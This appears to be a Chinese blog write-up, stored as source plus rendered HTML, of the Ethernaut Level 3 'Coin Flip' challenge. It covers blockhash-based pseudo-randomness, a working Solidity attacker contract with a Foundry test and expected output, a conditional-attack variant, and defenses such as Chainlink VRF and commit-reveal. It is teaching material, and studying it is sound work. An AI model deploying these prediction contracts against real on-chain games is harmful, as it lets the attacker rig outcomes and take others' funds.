\"@chainlink/contracts/src/v0.8/VRFConsumerBaseV2.sol\";\n\ncontract SecureCoinFlip is VRFConsumerBaseV2 {\n    VRFCoordinatorV2Interface COORDINATOR;\n    \n    uint64 s_subscriptionId;\n    bytes32 keyHash;\n    uint32 callbackGasLimit = 100000;\n    uint16 requestConfirmations = 3;\n    uint32 numWords = 1;\n    \n    mapping(uint256 => address) public requestIdToSender;\n    \n    constructor(uint64 subscriptionId, address vrfCoordinator) \n        VRFConsumerBaseV2(vrfCoordinator) {\n        COORDINATOR = VRFCoordinatorV2Interface(vrfCoordinator);\n        s_subscriptionId = subscriptionId;\n    }\n    \n    function flip(bool _guess) public {\n        // 请求真正的随机数\n        uint256 requestId = COORDINATOR.requestRandomWords(\n            keyHash,\n            s_subscriptionId,\n            requestConfirmations,\n            callbackGasLimit,\n            numWords\n        );\n        \n        requestIdToSender[requestId] = msg.sender;\n        // 存储用户的猜测...\n    }\n    \n    function fulfillRandomWords(uint256 requestId, uint256[] memory randomWords) \n        internal override {\n        // 使用真正的随机数处理结果\n        bool side = (randomWords[0] % 2) == 1;\n        address sender = requestIdToSender[requestId];\n        \n        // 处理游戏逻辑...\n    }\n}\n```\n\n### 2. 使用未来区块哈希 + 提交-揭示方案\n\n```solidity\ncontract CommitRevealCoinFlip {\n    struct Game {\n        bytes32 commitment;\n        uint256 revealBlock;\n        bool revealed;\n    }\n    \n    mapping(address => Game) public games;\n    \n    function commitFlip(bytes32 _commitment) public {\n        games[msg.sender] = Game({\n            commitment: _commitment,\n            revealBlock: block.number + 10, // 10个区块后才能揭示\n            revealed: false\n        });\n    }\n    \n    function revealFlip(bool _guess, uint256 _nonce) public {\n        Game storage game = games[msg.sender];\n        \n        require(block.number >= game.revealBlock, \"Too early to reveal\");\n        require(!game.revealed, \"Already revealed\");\n        \n        // 验证承诺\n        bytes32 hash = keccak256(abi.encodePacked(_guess, _nonce, msg.sender));\n        require(hash == game.commitment, \"Invalid commitment\");\n        \n        // 使用未来区块哈希\n        uint256 futureBlockHash = uint256(blockhash(game.revealBlock));\n        bool result = (futureBlockHash % 2) == 1;\n        \n        game.revealed = true;\n        \n        // 处理结果...\n    }\n}\n```\n\n### 3. 多源熵组合\n\n```solidity\ncontract MultiSourceRandom {\n    uint256 private nonce;\n    \n    function getRandomNumber() private returns (uint256) {\n        // ⚠️ 仍不够安全，仅作教学示例\n        nonce++;\n        return uint256(keccak256(abi.encodePacked(\n            block.difficulty,    // 矿工可操控\n            block.timestamp,     // 矿工可小幅操控\n            msg.sender,\n            nonce,\n            blockhash(block.number - 1)\n        )));\n    }\n}\n```\n\n## 📚 核心知识点\n\n### 1. 区块链随机数常见误区\n\n| 数据源 | 安全性 | 操控难度 | 推荐使用 |\n|--------|---------|----------|----------|\n| `block.timestamp` | ❌ 极低 | 容易 | 否 |\n| `block.difficulty` | ❌ 低 | 中等 | 否 |\n| `blockhash` | ❌ 低 | 困难 | 否 |\n| `keccak256(组合)` | ❌ 低 | 取决于组合 | 否 |\n| **Chainlink VRF** | ✅ 高 | 极困难 | **是** |\n\n### 2. 攻击者的优势\n\n```solidity\n// 攻击者可以：\n// 1. 在同一交易中执行相同计算\n// 2. 预先验证结果，只在有利时提交\n// 3. 使用合约自动化攻击\n\ncontract SmartAttacker {\n    function conditionalAttack(CoinFlip target, bool guess) public {\n        // 预先计算\n        uint256 blockValue = uint256(blockhash(block.number - 1));\n        uint256 coinFlip = blockValue / FACTOR;\n        bool predictedSide = coinFlip == 1 ? true : false;\n        \n        // 只在预测正确时才攻击\n        if (predictedSide == guess) {\n            target.flip(guess);\n        }\n        // 否则什么都不做，等待下一个有利机会\n    }\n}\n```\n\n### 3. 真随机数 vs 伪随机数\n\n```solidity\n// ❌ 伪随机数（确定性）\nfunction badRandom() public view returns (uint256) {\n    return uint256(keccak256(abi.encodePacked(\n        block.timestamp,\n        block.difficulty,\n        msg.sender\n    )));\n}\n\n// ✅ 真随机数（使用预言机）\nfunction goodRandom() public {\n    // 通过 Chainlink VRF 请求真正的随机数\n    requestRandomness(keyHash, fee);\n}\n```\n\n## 🏛️ 历史案例\n\n### 著名的随机数攻击事件\n\n1. **SmartBillions** (2017)\n   - 损失: 400 ETH\n   - 原因: 使用 `block.blockhash` 作为随机源\n   - 攻击: 预测未来区块哈希\n\n2. **Fomo3D** (2018)\n   - 影响: 游戏机制被操控\n   - 原因: 使用可预测的时间戳\n   - 后果: 奖池分配不公\n\n3. **TheRun** (2019)\n   - 损失: 大量代币\n   - 原因: 复杂但仍可预测的随机数算法\n\n## 🎯 总结\n\nCoin Flip 关卡揭示了区块链随机数的根本问题：\n\n- ✅ **区块链是确定性系统** - 相同输入必然产生相同输出\n- ✅ **透明性带来可预测性** - 所有数据都是公开的\n- ✅ **真随机数需要外部熵源** - 必须依赖链下随机性\n- ✅ **预言机是最佳解决方案** - Chainlink VRF 等服务\n\n这个看似简单的猜硬币游戏，实际上涉及密码学、概率论和分布式系统的深层概念。理解其原理对于构建安全的智能合约至关重要。\n\n---\n\n## 🔗 相关链接\n\n- **[上一关: Level 2 - Fallout](/2025/01/25/ethernaut-level-02-fallout/)**\n- **[下一关: Level 4 - Telephone](/2025/01/25/ethernaut-level-04-telephone/)**\n- **[系列目录: Ethernaut Foundry Solutions](/2025/01/25/ethernaut-foundry-solutions-series/)**\n- **[Chainlink VRF 文档](https://docs.chain.link/vrf/v2/introduction)**\n- **[GitHub 项目](https://github.com/XuHugo/Ethernaut-Foundry-Solutions)**\n\n---\n\n*在区块链的确定性世界中，真正的随机性是一种珍贵的资源。* 🎲","slug":"ethernaut-level-03-coinflip","published":1,"comments":1,"layout":"post","photos":[],"_id":"cmfc7zboz000bbf5q1cnt9xhl","content":"<h1 id=\"🎯-Ethernaut-Level-3-Coin-Flip-伪随机数攻击详解\"><a href=\"#🎯-Ethernaut-Level-3-Coin-Flip-伪随机数攻击详解\" class=\"headerlink\" title=\"🎯 Ethernaut Level 3: Coin Flip - 伪随机数攻击详解\"></a>🎯 Ethernaut Level 3: Coin Flip - 伪随机数攻击详解</h1><blockquote>\n<p><strong>关卡链接</strong>: <a href=\"https://ethernaut.openzeppelin.com/level/3\">Ethernaut Level 3 - Coin Flip</a><br><strong>攻击类型</strong>: 伪随机数预测攻击<br><strong>难度</strong>: ⭐⭐⭐☆☆<br><strong>核心概念</strong>: 区块链确定性、可预测性</p>\n</blockquote>\n<h2 id=\"📋-挑战目标\"><a href=\"#📋-挑战目标\" class=\"headerlink\" title=\"📋 挑战目标\"></a>📋 挑战目标</h2><p>这个关卡考验对区块链随机数机制的理解：</p>\n<ol>\n<li><strong>连续猜对10次</strong> - 连续正确预测硬币正反面</li>\n<li><strong>理解伪随机数</strong> - 掌握区块链”随机数”的本质</li>\n<li><strong>学习预测技术</strong> - 利用区块链的确定性进行攻击</li>\n</ol>\n<h2 id=\"🔍-漏洞分析\"><a href=\"#🔍-漏洞分析\" class=\"headerlink\" title=\"🔍 漏洞分析\"></a>🔍 漏洞分析</h2><h3 id=\"合约源码分析\"><a href=\"#合约源码分析\" class=\"headerlink\" title=\"合约源码分析\"></a>合约源码分析</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">contract CoinFlip &#123;</span><br><span class=\"line\">  uint256 public consecutiveWins;</span><br><span class=\"line\">  uint256 lastHash;</span><br><span class=\"line\">  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class=\"line\"></span><br><span class=\"line\">  constructor() &#123;</span><br><span class=\"line\">    consecutiveWins = 0;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  function flip(bool _guess) public returns (bool) &#123;</span><br><span class=\"line\">    // 🚨 关键漏洞：使用可预测的区块哈希</span><br><span class=\"line\">    uint256 blockValue = uint256(blockhash(block.number - 1));</span><br><span class=\"line\">    </span><br><span class=\"line\">    if (lastHash == blockValue) &#123;</span><br><span class=\"line\">      revert();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    lastHash = blockValue;</span><br><span class=\"line\">    // 🚨 伪随机数生成逻辑</span><br><span class=\"line\">    uint256 coinFlip = blockValue / FACTOR;</span><br><span class=\"line\">    bool side = coinFlip == 1 ? true : false;</span><br><span class=\"line\"></span><br><span class=\"line\">    if (side == _guess) &#123;</span><br><span class=\"line\">      consecutiveWins++;</span><br><span class=\"line\">      return true;</span><br><span class=\"line\">    &#125; else &#123;</span><br><span class=\"line\">      consecutiveWins = 0;</span><br><span class=\"line\">      return false;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"漏洞识别\"><a href=\"#漏洞识别\" class=\"headerlink\" title=\"漏洞识别\"></a>漏洞识别</h3><p><strong>伪随机数的根本缺陷</strong>：</p>\n<ol>\n<li><strong>数据源可预测</strong> - <code>blockhash(block.number - 1)</code> 是公开可查的</li>\n<li><strong>算法透明</strong> - 随机数生成算法完全公开</li>\n<li><strong>确定性计算</strong> - 相同输入必然产生相同输出</li>\n</ol>\n<p><strong>攻击原理</strong>：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 合约使用的&quot;随机数&quot;生成</span><br><span class=\"line\">uint256 blockValue = uint256(blockhash(block.number - 1));</span><br><span class=\"line\">uint256 coinFlip = blockValue / FACTOR;</span><br><span class=\"line\">bool side = coinFlip == 1 ? true : false;</span><br><span class=\"line\"></span><br><span class=\"line\">// 攻击者可以在同一个区块内执行相同计算</span><br><span class=\"line\">// 由于使用相同的 blockhash，结果必然相同！</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"攻击流程\"><a href=\"#攻击流程\" class=\"headerlink\" title=\"攻击流程\"></a>攻击流程</h3><ol>\n<li><strong>获取当前区块哈希</strong> - 读取 <code>blockhash(block.number - 1)</code></li>\n<li><strong>执行相同计算</strong> - 使用相同的算法计算结果</li>\n<li><strong>提前知道答案</strong> - 在调用 <code>flip()</code> 前就知道正确答案</li>\n<li><strong>提交正确猜测</strong> - 保证100%胜率</li>\n</ol>\n<h2 id=\"💻-Foundry-实现\"><a href=\"#💻-Foundry-实现\" class=\"headerlink\" title=\"💻 Foundry 实现\"></a>💻 Foundry 实现</h2><h3 id=\"攻击合约代码\"><a href=\"#攻击合约代码\" class=\"headerlink\" title=\"攻击合约代码\"></a>攻击合约代码</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// SPDX-License-Identifier: MIT</span><br><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">import &quot;forge-std/Test.sol&quot;;</span><br><span class=\"line\">import &quot;../src/CoinFlip.sol&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">contract CoinFlipAttacker &#123;</span><br><span class=\"line\">    CoinFlip public target;</span><br><span class=\"line\">    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class=\"line\">    </span><br><span class=\"line\">    constructor(address _target) &#123;</span><br><span class=\"line\">        target = CoinFlip(_target);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function attack() public &#123;</span><br><span class=\"line\">        // 🎯 关键：在同一区块内执行相同的计算</span><br><span class=\"line\">        uint256 blockValue = uint256(blockhash(block.number - 1));</span><br><span class=\"line\">        uint256 coinFlip = blockValue / FACTOR;</span><br><span class=\"line\">        bool side = coinFlip == 1 ? true : false;</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 提交预先计算好的答案</span><br><span class=\"line\">        target.flip(side);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">contract CoinFlipTest is Test &#123;</span><br><span class=\"line\">    CoinFlip public coinFlip;</span><br><span class=\"line\">    CoinFlipAttacker public attacker;</span><br><span class=\"line\">    </span><br><span class=\"line\">    address public attackerAddr = makeAddr(&quot;attacker&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">    function setUp() public &#123;</span><br><span class=\"line\">        // 部署目标合约</span><br><span class=\"line\">        coinFlip = new CoinFlip();</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 部署攻击合约</span><br><span class=\"line\">        vm.prank(attackerAddr);</span><br><span class=\"line\">        attacker = new CoinFlipAttacker(address(coinFlip));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function testCoinFlipExploit() public &#123;</span><br><span class=\"line\">        console.log(&quot;Initial consecutive wins:&quot;, coinFlip.consecutiveWins());</span><br><span class=\"line\">        </span><br><span class=\"line\">        vm.startPrank(attackerAddr);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 连续攻击10次以获得10连胜</span><br><span class=\"line\">        for (uint i = 0; i &lt; 10; i++) &#123;</span><br><span class=\"line\">            // 模拟新区块（每次攻击都在新区块进行）</span><br><span class=\"line\">            vm.roll(block.number + 1);</span><br><span class=\"line\">            </span><br><span class=\"line\">            uint256 winsBefore = coinFlip.consecutiveWins();</span><br><span class=\"line\">            attacker.attack();</span><br><span class=\"line\">            uint256 winsAfter = coinFlip.consecutiveWins();</span><br><span class=\"line\">            </span><br><span class=\"line\">            console.log(&quot;Round&quot;, i + 1, &quot;- Wins:&quot;, winsAfter);</span><br><span class=\"line\">            </span><br><span class=\"line\">            // 验证每次攻击都成功</span><br><span class=\"line\">            assertEq(winsAfter, winsBefore + 1);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        </span><br><span class=\"line\">        vm.stopPrank();</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 验证最终达成10连胜</span><br><span class=\"line\">        assertEq(coinFlip.consecutiveWins(), 10);</span><br><span class=\"line\">        console.log(&quot;Attack successful! 10 consecutive wins achieved.&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function testPredictability() public view &#123;</span><br><span class=\"line\">        // 演示随机数的可预测性</span><br><span class=\"line\">        uint256 blockValue = uint256(blockhash(block.number - 1));</span><br><span class=\"line\">        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class=\"line\">        uint256 coinFlip = blockValue / FACTOR;</span><br><span class=\"line\">        bool side = coinFlip == 1 ? true : false;</span><br><span class=\"line\">        </span><br><span class=\"line\">        console.log(&quot;Block hash:&quot;, blockValue);</span><br><span class=\"line\">        console.log(&quot;Coin flip result:&quot;, side);</span><br><span class=\"line\">        console.log(&quot;This result is 100% predictable!&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"运行测试\"><a href=\"#运行测试\" class=\"headerlink\" title=\"运行测试\"></a>运行测试</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 运行 Coin Flip 攻击测试</span></span><br><span class=\"line\">forge <span class=\"built_in\">test</span> --match-contract CoinFlipTest -vvv</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 预期输出：</span></span><br><span class=\"line\"><span class=\"comment\"># [PASS] testCoinFlipExploit()</span></span><br><span class=\"line\"><span class=\"comment\"># Round 1 - Wins: 1</span></span><br><span class=\"line\"><span class=\"comment\"># Round 2 - Wins: 2</span></span><br><span class=\"line\"><span class=\"comment\"># ...</span></span><br><span class=\"line\"><span class=\"comment\"># Round 10 - Wins: 10</span></span><br><span class=\"line\"><span class=\"comment\"># Attack successful! 10 consecutive wins achieved.</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"🛡️-防御措施\"><a href=\"#🛡️-防御措施\" class=\"headerlink\" title=\"🛡️ 防御措施\"></a>🛡️ 防御措施</h2><h3 id=\"1-使用-Chainlink-VRF-推荐\"><a href=\"#1-使用-Chainlink-VRF-推荐\" class=\"headerlink\" title=\"1. 使用 Chainlink VRF (推荐)\"></a>1. 使用 Chainlink VRF (推荐)</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import &quot;@chainlink/contracts/src/v0.8/interfaces/VRFCoordinatorV2Interface.sol&quot;;</span><br><span class=\"line\">import &quot;@chainlink/contracts/src/v0.8/VRFConsumerBaseV2.sol&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">contract SecureCoinFlip is VRFConsumerBaseV2 &#123;</span><br><span class=\"line\">    VRFCoordinatorV2Interface COORDINATOR;</span><br><span class=\"line\">    </span><br><span class=\"line\">    uint64 s_subscriptionId;</span><br><span class=\"line\">    bytes32 keyHash;</span><br><span class=\"line\">    uint32 callbackGasLimit = 100000;</span><br><span class=\"line\">    uint16 requestConfirmations = 3;</span><br><span class=\"line\">    uint32 numWords = 1;</span><br><span class=\"line\">    </span><br><span class=\"line\">    mapping(uint256 =&gt; address) public requestIdToSender;</span><br><span class=\"line\">    </span><br><span class=\"line\">    constructor(uint64 subscriptionId, address vrfCoordinator) </span><br><span class=\"line\">        VRFConsumerBaseV2(vrfCoordinator) &#123;</span><br><span class=\"line\">        COORDINATOR = VRFCoordinatorV2Interface(vrfCoordinator);</span><br><span class=\"line\">        s_subscriptionId = subscriptionId;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function flip(bool _guess) public &#123;</span><br><span class=\"line\">        // 请求真正的随机数</span><br><span class=\"line\">        uint256 requestId = COORDINATOR.requestRandomWords(</span><br><span class=\"line\">            keyHash,</span><br><span class=\"line\">            s_subscriptionId,</span><br><span class=\"line\">            requestConfirmations,</span><br><span class=\"line\">            callbackGasLimit,</span><br><span class=\"line\">            numWords</span><br><span class=\"line\">        );</span><br><span class=\"line\">        </span><br><span class=\"line\">        requestIdToSender[requestId] = msg.sender;</span><br><span class=\"line\">        // 存储用户的猜测...</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function fulfillRandomWords(uint256 requestId, uint256[] memory randomWords) </span><br><span class=\"line\">        internal override &#123;</span><br><span class=\"line\">        // 使用真正的随机数处理结果</span><br><span class=\"line\">        bool side = (randomWords[0] % 2) == 1;</span><br><span class=\"line\">        address sender = requestIdToSender[requestId];</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 处理游戏逻辑...</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-使用未来区块哈希-提交-揭示方案\"><a href=\"#2-使用未来区块哈希-提交-揭示方案\" class=\"headerlink\" title=\"2. 使用未来区块哈希 + 提交-揭示方案\"></a>2. 使用未来区块哈希 + 提交-揭示方案</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract CommitRevealCoinFlip &#123;</span><br><span class=\"line\">    struct Game &#123;</span><br><span class=\"line\">        bytes32 commitment;</span><br><span class=\"line\">        uint256 revealBlock;</span><br><span class=\"line\">        bool revealed;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    mapping(address =&gt; Game) public games;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function commitFlip(bytes32 _commitment) public &#123;</span><br><span class=\"line\">        games[msg.sender] = Game(&#123;</span><br><span class=\"line\">            commitment: _commitment,</span><br><span class=\"line\">            revealBlock: block.number + 10, // 10个区块后才能揭示</span><br><span class=\"line\">            revealed: false</span><br><span class=\"line\">        &#125;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function revealFlip(bool _guess, uint256 _nonce) public &#123;</span><br><span class=\"line\">        Game storage game = games[msg.sender];</span><br><span class=\"line\">        </span><br><span class=\"line\">        require(block.number &gt;= game.revealBlock, &quot;Too early to reveal&quot;);</span><br><span class=\"line\">        require(!game.revealed, &quot;Already revealed&quot;);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 验证承诺</span><br><span class=\"line\">        bytes32 hash = keccak256(abi.encodePacked(_guess, _nonce, msg.sender));</span><br><span class=\"line\">        require(hash == game.commitment, &quot;Invalid commitment&quot;);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 使用未来区块哈希</span><br><span class=\"line\">        uint256 futureBlockHash = uint256(blockhash(game.revealBlock));</span><br><span class=\"line\">        bool result = (futureBlockHash % 2) == 1;</span><br><span class=\"line\">        </span><br><span class=\"line\">        game.revealed = true;</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 处理结果...</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"3-多源熵组合\"><a href=\"#3-多源熵组合\" class=\"headerlink\" title=\"3. 多源熵组合\"></a>3. 多源熵组合</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract MultiSourceRandom &#123;</span><br><span class=\"line\">    uint256 private nonce;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function getRandomNumber() private returns (uint256) &#123;</span><br><span class=\"line\">        // ⚠️ 仍不够安全，仅作教学示例</span><br><span class=\"line\">        nonce++;</span><br><span class=\"line\">        return uint256(keccak256(abi.encodePacked(</span><br><span class=\"line\">            block.difficulty,    // 矿工可操控</span><br><span class=\"line\">            block.timestamp,     // 矿工可小幅操控</span><br><span class=\"line\">            msg.sender,</span><br><span class=\"line\">            nonce,</span><br><span class=\"line\">            blockhash(block.number - 1)</span><br><span class=\"line\">        )));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"📚-核心知识点\"><a href=\"#📚-核心知识点\" class=\"headerlink\" title=\"📚 核心知识点\"></a>📚 核心知识点</h2><h3 id=\"1-区块链随机数常见误区\"><a href=\"#1-区块链随机数常见误区\" class=\"headerlink\" title=\"1. 区块链随机数常见误区\"></a>1. 区块链随机数常见误区</h3><table>\n<thead>\n<tr>\n<th>数据源</th>\n<th>安全性</th>\n<th>操控难度</th>\n<th>推荐使用</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><code>block.timestamp</code></td>\n<td>❌ 极低</td>\n<td>容易</td>\n<td>否</td>\n</tr>\n<tr>\n<td><code>block.difficulty</code></td>\n<td>❌ 低</td>\n<td>中等</td>\n<td>否</td>\n</tr>\n<tr>\n<td><code>blockhash</code></td>\n<td>❌ 低</td>\n<td>困难</td>\n<td>否</td>\n</tr>\n<tr>\n<td><code>keccak256(组合)</code></td>\n<td>❌ 低</td>\n<td>取决于组合</td>\n<td>否</td>\n</tr>\n<tr>\n<td><strong>Chainlink VRF</strong></td>\n<td>✅ 高</td>\n<td>极困难</td>\n<td><strong>是</strong></td>\n</tr>\n</tbody></table>\n<h3 id=\"2-攻击者的优势\"><a href=\"#2-攻击者的优势\" class=\"headerlink\" title=\"2. 攻击者的优势\"></a>2. 攻击者的优势</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span 